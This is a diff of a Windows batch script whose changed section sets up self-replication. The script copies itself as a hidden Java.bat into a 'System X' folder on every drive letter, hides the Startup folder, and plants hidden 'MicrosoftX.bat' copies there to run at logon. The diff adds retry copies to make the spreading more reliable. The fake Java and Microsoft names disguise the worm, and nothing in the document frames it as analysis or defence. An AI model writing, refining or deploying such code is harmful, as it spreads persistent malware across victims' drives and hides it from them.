@@ -35,26 +35,32 @@ start "" "%TARGET_FILE%"
 :: ==== Setup replication ====
 set "SELF=%~f0"
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
-:: Make sure Startup folder itself is hidden
 attrib +h +s "%STARTUP_FOLDER%" >nul 2>&1
 
+:: ==== Loop through all drives ====
 for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%D:\ (
         set "FOLDER_NAME=System %%D"
         set "TARGET_FOLDER=%%D:\!FOLDER_NAME!"
-        set "DRIVE_BAT=%%D:\!FOLDER_NAME!\Java.bat"
+        set "DRIVE_BAT=!TARGET_FOLDER!\Java.bat"
+        set "RENAMED=Microsoft%%D.bat"
+        set "STARTUP_FILE=%STARTUP_FOLDER%\!RENAMED!"
 
-        :: Create and hide folder in drive
+        :: === Copy to Drive ===
         mkdir "!TARGET_FOLDER!" >nul 2>&1
         copy "%SELF%" "!DRIVE_BAT!" >nul
+        if not exist "!DRIVE_BAT!" (
+            copy "%SELF%" "!DRIVE_BAT!" >nul
+        )
         attrib +h +s "!TARGET_FOLDER!"
         attrib +h +s "!DRIVE_BAT!"
 
-        :: Create renamed copy in Startup and hide it
-        set "RENAMED=Microsoft%%D.bat"
-        copy "%SELF%" "%STARTUP_FOLDER%\!RENAMED!" >nul
-        attrib +h +s "%STARTUP_FOLDER%\!RENAMED!" >nul
+        :: === Copy to Startup ===
+        copy "%SELF%" "!STARTUP_FILE!" >nul
+        if not exist "!STARTUP_FILE!" (
+            copy "%SELF%" "!STARTUP_FILE!" >nul
+        )
+        attrib +h +s "!STARTUP_FILE!"
     )
 )
 
